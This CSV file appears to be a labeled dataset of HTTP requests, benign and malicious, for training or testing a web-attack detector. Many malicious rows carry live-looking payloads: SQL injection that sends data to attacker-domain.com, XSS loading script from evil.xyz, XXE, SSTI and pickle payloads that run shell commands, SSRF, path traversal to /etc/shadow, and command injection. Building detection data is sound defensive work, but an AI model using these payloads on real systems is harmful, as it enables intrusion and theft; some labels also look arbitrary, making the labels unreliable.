label,text
benign,"POST /rest/api/v3/newuser HTTP/1.1
Host: user-onboarding-solutions.net
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjAzIn0.abcd9876efgh5432ijkl
Content-Type: application/xml
Accept: application/xml
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Content-Length: 180
Cache-Control: no-cache
Connection: keep-alive

<user>
  <username>amanda.patton</username>
  <email>amanda.patton@user-onboarding-solutions.net</email>
  <fullName>Amanda Patton</fullName>
  <role>editor</role>
  <startDate>2024-06-01</startDate>
</user>"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: assets-storefront.io
Accept: image/png,image/*;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Connection: close
Cache-Control: max-age=3600"
benign,"POST /api/v2/upload/inventory HTTP/1.1
Host: inventory-management.cloud-warehouses.org
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: keep-alive
Content-Type: text/csv
Content-Length: 115
Authorization: ApiKey XyNw39-F7klqO79sbCzw

item_id,warehouse_id,quantity,last_updated
98765,WH-A1,300,2024-06-01T08:59:00Z
98766,WH-A2,118,2024-06-01T09:02:15Z
98767,WH-B1,210,2024-06-01T09:04:03Z"
malicious,"GET /status/report HTTP/1.1
Host: media-streaming-central.io
User-Agent: Python-requests/2.25.1
Accept: */*
X-Pickle-Info: \x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00cos\nbuiltins\nexec\n\x94\x8c\x21__import__('os').system('netstat -anp')\x94\x93\x94."
benign,"GET /filemanager/export?file=report-final.pdf HTTP/1.1
Host: cloudproject-storage.io
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: application/pdf
Accept-Language: en-US,en;q=0.7
Via: 1.1 varnish
Cache-Control: no-cache
Connection: keep-alive"
malicious,"POST /login HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Content-Length: 117
Cache-Control: no-cache
Connection: keep-alive

user=' or substring(concat(substring(//members/member[1]/password,1,1),'XYZ'),2,1)='H'&pass=letmein"
malicious,"GET /files/load?file=http%3A%2F%2Fimg.assets-digitalhub.co%2Fsample.png&file=http%3A%2F%2F10.1.1.1%2Fconfidential&size=medium HTTP/1.1
Host: img.assets-digitalhub.co
User-Agent: Python-urllib/3.8
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://dashboard.assets-digitalhub.co/home"
malicious,"GET /resources/js/..%2F..%2F..%2F..%2Fboot.ini HTTP/1.1
Host: publiccdn-media.ai
User-Agent: curl/7.68.0
Accept: */*
Cache-Control: max-age=0"
benign,"POST /member/session/login HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
X-CSRF-Token: b3e5d68d7af5441c8f605aefa43f6ea5
Origin: https://my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Content-Length: 73

{""username"":""lisa.marshall"",""password"":""Sunshine!2024""}"
benign,"HEAD /videos/presentations/keynote_summer2024.webm HTTP/1.1
Host: event-streaming-platform.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: video/webm, video/*;q=0.9, */*;q=0.8
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
malicious,"POST /api/v3/links/validate HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/dashboard

target_service=dict://127.0.0.1:11211/stats"
malicious,"GET /blog/article/view?post_id=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%2520version%28%29%29%2C%27.attacker-domain.com%5C%5Cdata%27%29%29%29--%2520 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Cookie: blog_sid=3b1f4e7a9c2d8e5f0a6b7c1d
Referer: https://my-personal-blog-site.info/blog/recent"
benign,"PUT /api/data/item123 HTTP/1.1
Host: customer-feedback-hub.service-data-platform.org
Accept: text/plain
Content-Type: text/plain
Content-Length: 12
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.141 Mobile Safari/537.36
Referer: https://customer-feedback-hub.service-data-platform.org/forms/open
Connection: close

Feedback marked ok."
benign,"GET /static/assets/icons/logo-retina.png HTTP/1.1
Host: bizportal-northamerica.com
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://bizportal-northamerica.com/login
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Connection: keep-alive"
benign,"POST /api/v3/users/create HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
Origin: https://my-personal-blog-site.info
X-Requested-With: XMLHttpRequest
User-Agent: python-requests/2.31.0
Content-Length: 116
Connection: keep-alive

{""username"":""emily_roberts"",""email"":""emily.roberts@personal-blog.info"",""password"":""NotebookPass12"",""bio"":""Aspiring writer and tech enthusiast"",""agreeTerms"":true}"
malicious,"POST /api/importConfiguration HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 387
Cookie: sessionToken=81b6fd39d2a7447ea485b6c94612e9d8; Path=/; HttpOnly
Connection: keep-alive

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""userId""

32485
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""uploadFile""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------WebKitFormBoundary7MA4YWxkTrZu0gW--"
benign,"GET /ping HTTP/1.1
Host: service-api-status.smartmetrics.ai
User-Agent: python-requests/2.28.1
Accept: */*"
benign,"POST /v2/users/password/reset HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Origin: https://secure-user-portal.net
Content-Length: 52

{""email"":""harry_knight87@secure-user-portal.net""}"
malicious,"GET /chat/notifications HTTP/1.1
Host: mobi-social-network.co
User-Agent: Mozilla/5.0 <script>alert('LogViewerXSS')</script> (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/javascript
X-Requested-With: FetchAPIClient
Accept-Language: en-US,en;q=0.5"
benign,"GET /category/smartphones HTTP/1.1
Host: gadgetcorner.ai
Connection: keep-alive
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-FR,fr;q=0.9,en;q=0.8
Referer: https://gadgetcorner.ai/
Cookie: user_sid=e9b6d7c29eb3c39d1f7c; cart_id=9d0a2fb854
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
benign,"GET /blog/article/view/entry?id=post_alpha_r5 HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml
Upgrade-Insecure-Requests: 1
Referer: https://my-personal-blog-site.info/blog/home
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Connection: keep-alive"
benign,"GET /category/tech/gadget-reviews HTTP/1.1
Host: techforward-magazine.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://techforward-magazine.net/category/tech/
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"PUT /api/users/55555/settings HTTP/1.1
Host: enterprise-fintech-solutions.tech
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjE2In0.eyJpc3MiOiJmb250ZWNoIiwic3ViIjoiNTU1NTUiLCJpYXQiOjE2ODc1MTEyMDB9.oPPpjnpHxCtf8hUa-xHqkRxQHUztqhfvCqP0XQ9DkyZ5muA8tjVz70rSZ6xeTdHY6Xm-C4i2e3he7_sQkG89GzIJAgHcRiJL6EjAcUQD0oK9xX8OiMslrxMb-M6SiX8FiVV0Z6Xnq-JfG5DtxB51N_DY2Me-Xn34VQWMLhNA6cQ
Content-Type: application/json
Accept: application/json
Content-Length: 238

{
  ""profile_info"": {
    ""user_tag"": ""vipclient"",
    ""contact_email"": ""client55555@fintechpro.tech""
  },
  ""account_modifiers"": {
    ""plan_level"": ""gold"",
    ""admin_flags"": {
      ""can_edit_sensitive"": true,
      ""credit_limit_override"": 150000
    }
  }
}"
benign,"GET /documents/export?file=conference-schedule_2023.pdf HTTP/1.1
Host: event-planning-suite.org
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: application/pdf
Accept-Encoding: gzip, deflate
Referer: https://event-planning-suite.org/schedule
Connection: keep-alive"
benign,"POST /upload/image HTTP/1.1
Host: personal-photo-album.org
Connection: keep-alive
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=----BoundaryForMultipart123
Content-Length: 349
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cC...
Referer: https://personal-photo-album.org/gallery/upload

------BoundaryForMultipart123
Content-Disposition: form-data; name=""file""; filename=""vacation-notes.txt""
Content-Type: text/plain

Summer vacation photos uploaded for sharing with family.
------BoundaryForMultipart123--"
malicious,"POST /user/preferences HTTP/1.1
Host: smart-home-hub.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: application/json
Content-Type: application/json
Content-Length: 44
X-Feature-Flag: override-enabled

{""preferences"":{""theme"":""dark"",""notifications"":true}}"
benign,"POST /submit/form HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: multipart/form-data; boundary=----FormBoundaryxyz123abc
Content-Length: 279
Referer: https://community.game-dev-forum.org/newthread
Connection: close

------FormBoundaryxyz123abc
Content-Disposition: form-data; name=""thread_title""

Tips for optimizing Unity shaders
------FormBoundaryxyz123abc
Content-Disposition: form-data; name=""post_body""

Hi all, I would like to share some optimization tips I found for Unity shaders that reduce draw calls and improve frame rates.
------FormBoundaryxyz123abc
Content-Disposition: form-data; name=""category""

Rendering
------FormBoundaryxyz123abc--"
benign,"PUT /api/user-preferences/204 HTTP/1.1
Host: notifications-service.cloudapp.ai
Authorization: Bearer BQY76GOK45TX89PLMV456CJI3RQWERTY
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1
DNT: 1
Connection: keep-alive
Content-Length: 102

{""userId"":204,""emailAlerts"":true,""smsAlerts"":false,""pushNotifications"":true,""preferredTime"":""18:30"",""channels"":[""email"",""push""]}"
malicious,"GET /files/download/%7B%7B''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__'].__import__(%22os%22).popen(%22ls%20-la%20/tmp%22).read()%7D%7D/archive HTTP/1.1
Host: online-retail-store.biz
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive"
benign,"GET /news/local/recent-updates HTTP/1.1
Host: citypulse-news.ai
Cookie: token=4990a6d78c9f12d; prefer_fonts=serif; session_status=active; visit_count=18
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36
Accept: text/html,application/xhtml+xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"POST /api/v5/project/run-scan HTTP/1.1
Host: devsecops-portal.dev
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Content-Type: application/json
Accept: application/json, text/plain, */*
Content-Length: 98
Connection: keep-alive

{
  ""project_id"": ""ds-9821"",
  ""scan_parameters"": {
    ""mode"": ""quick"",
    ""command_line"": ""npm run test:unit""
  }
}"
malicious,"POST /login HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Cache-Control: no-cache

LoginName=customer%00%03%01<script src=https://evil.xyz/x.js></script>&Password=pass123!"
malicious,"PUT /api/v3/items/search HTTP/1.1
Host: media-streaming-platform.tv
User-Agent: Python-urllib/3.9
Accept: application/json
Content-Type: application/json
Content-Length: 291
Accept-Charset: utf-8, iso-8859-1;q=0.5
Cookie: sessionid=8493029862349823
Origin: https://media-streaming-platform.tv
Cache-Control: no-cache

{
  ""search_query"": ""latest releases%0d%0aContent-Type:%20application/json%0d%0aLocation:%20http://badstuff.media-streaming-platform.tv/attack%0d%0a%0d%0a{""fake"":""payload""}"",
  ""page"": 1
}"
malicious,"GET /content/templates/main.html HTTP/1.1
Host: localized-web-interface.dev
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: page_template=../../../../var/www/html/index.php%00default
Cache-Control: max-age=0"
benign,"GET /session/data?id=54bd9f8e-11ea-44bb-85f3-9e6dbb7b133a HTTP/1.1
Host: analytics.trackerport.biz
Accept: application/json
Accept-Language: en-US,en;q=0.8
Referer: https://dashboard.trackerport.biz/overview
User-Agent: python-requests/2.28.1
Connection: keep-alive"
malicious,"POST /profile/settings HTTP/1.1
Host: auth-data-exchange.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: https://auth-data-exchange.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJhbGciOiJIUzI1NiJ9.abc123.def456

fullname=John+Doe&user_bio=<!--#iNcLuDe vIrTuAl='/etc/passwd' -->"
benign,"GET /scripts/lib/jquery.min.js HTTP/1.1
Host: social-forum-network.info
Accept: application/javascript,*/*;q=0.5
User-Agent: PHP/7.4 curl
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"HEAD /blog/post/innovation-in-ai HTTP/1.1
Host: tech-insight-media.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: text/html
Accept-Encoding: gzip, deflate, br
Referer: https://tech-insight-media.net/blog
Connection: close"
benign,"GET /v1/reports/monthly HTTP/1.1
Host: reporting-platform.ai
Accept: application/json
App-Secret: c9d183a7ef4d2b6a792f4e161d7c3802
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Cache-Control: no-cache"
benign,"OPTIONS /profile/edit HTTP/1.1
Host: edit-profiles.socialcommunity.network
Origin: https://mobileapp.socialcommunity.network
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization, content-type
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Connection: keep-alive"
benign,"POST /forum/thread/45/post_reply HTTP/1.1
Host: coding-huddle.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Referer: https://coding-huddle.org/forum/thread/45
Connection: close
Origin: https://coding-huddle.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
X-CSRF-Token: 3c8ef52dadccf4319887a9fcfde74a00

comment_text=Thanks+for+sharing+the+solution%21+It+worked+perfectly.+Looking+forward+to+more+discussions.&parent_id=12"
benign,"POST /beacon/track HTTP/1.1
Host: analytics.user-growthhub.io
Origin: https://dashboard.user-growthhub.io
Content-Type: text/plain
Content-Length: 37
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36

event=page_view&url=/account/settings"
benign,"GET /comments/fetch?postId=34826&callback=processData HTTP/1.1
Host: community-culture-forum.online
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: application/javascript
Accept-Language: en-US,en;q=0.6
Connection: keep-alive
Referer: https://community-culture-forum.online/posts/34826
Cache-Control: no-cache"
malicious,"POST /api/v2/order/submit HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
User-Agent: curl/7.77.0
Accept: */*
X-Requested-With: XMLHttpRequest

order_id=98765&notes=urgent%20delivery%0awhoami%0alc%20-la%20%2Fvar%2Flog%0a"
benign,"GET /blog/post/4372/urban-gardening-tips HTTP/1.1
Host: green-thumb-community.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Accept-Encoding: gzip, deflate
Cache-Control: max-age=3600
Connection: close"
benign,"OPTIONS /resources/clients/delete/7a4dfe HTTP/1.1
Host: client-services-platform.ai
Origin: https://portal.finance-solutions.biz
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.7
Connection: keep-alive"
benign,"POST /code-snippets/debug-tools.js HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/javascript
Content-Length: 36
Accept: */*
Pragma: no-cache
Connection: keep-alive

console.log('Debug tools initialized');"
malicious,"POST /api/v2/user/login HTTP/1.1
Host: poisoned-cache.attackerportal.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Length: 38

username=jdoe&password=secureCredentials123"
benign,"GET /community/forums/thread/3287/posts HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
X-Forwarded-For: 10.1.1.99
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Connection: keep-alive
Accept-Encoding: gzip"
malicious,"GET /dashboard HTTP/1.1
Host: finance-analytics-app.net
User-Agent: Mozilla/5.0 ""><script>eval(atob('YWxlcnQoIlN5c3RlbSBFcnJvciIp'))</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: keep-alive"
benign,"PUT /api/auth/users/9754326/settings HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJh...token_string
Content-Type: application/json
Accept: application/json
Origin: https://login.secure-user-portal.net
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Content-Length: 89
Connection: keep-alive

{""twoFactorEnabled"":true,""backupEmail"":""user9754_alt@securemail.net"",""smsAlerts"":false}"
benign,"POST /deployments/track-event.js HTTP/1.1
Host: live-analytics-service.cloud-ai.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Content-Type: application/javascript
Content-Length: 42
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

console.info('Event tracker loaded successfully');"
benign,"GET /robots.txt HTTP/1.1
Host: analytics-cloud-services.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/plain, */*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /media/photos/vacation/summer-2023/gallery-index.html HTTP/1.1
Host: my-personal-blog-site.info
Connection: close
If-Modified-Since: Mon, 03 Jul 2023 18:45:30 GMT
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Mobile Safari/537.36"
malicious,"GET /user/profile.shtml?user_greeting=Welcome%20back<!--#eChO var=""SERVER_NAME""--> HTTP/1.1
Host: private-intranet-web.org
User-Agent: Python-urllib/3.9
Accept: */*
Accept-Encoding: identity
Connection: close"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/javascript
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 138
Origin: https://community.game-dev-forum.org
Cookie: sid=3acb7f89d1e647b2a5f8c9d0e2b1a4c6

{""query"": ""/members/member[username='admin' and substring(password,1,1)='p']/id""}"
benign,"GET /lookup?address=742%20Evergreen%20Terrace%2C%20Springfield%2C%20State%20Province%2C%20Country%20Region%2C%20Postal%20Code%2082100%20with%20apartment%20number%20423B%20and%20landmark%20near%20the%20historic%20oak%20tree%20park HTTP/1.1
Host: maps.urban-query.io
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Connection: keep-alive"
malicious,"GET /resource/fetch/file:///etc/shadow HTTP/1.1
Host: secure-backend-portal.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive"
benign,"GET /js/vendor/jquery.min.js HTTP/1.1
Host: secure-user-portal.net
Accept: */*
Referer: https://secure-user-portal.net/login
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Connection: keep-alive"
benign,"POST /user/new HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Origin: https://login.cloud-data-services.ai
Referer: https://login.cloud-data-services.ai/signup
Connection: keep-alive
Cookie: session_token=xyz789abcdefghijklmnop1234567890

username=android_user143&email=android.user143%40cloud-data-services.ai&password=Str0ngPass2024&password_confirm=Str0ngPass2024&terms_accepted=true"
malicious,"POST /user/profile/update HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 ""><svg/onload=eval(atob('YWxlcnQoJ3VwZGF0ZSBhdHRlbXB0Jyk='))>
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Content-Length: 35
Origin: https://online-retail-store.biz
Cache-Control: max-age=0

name=John+Doe&email=john%40mail.com"
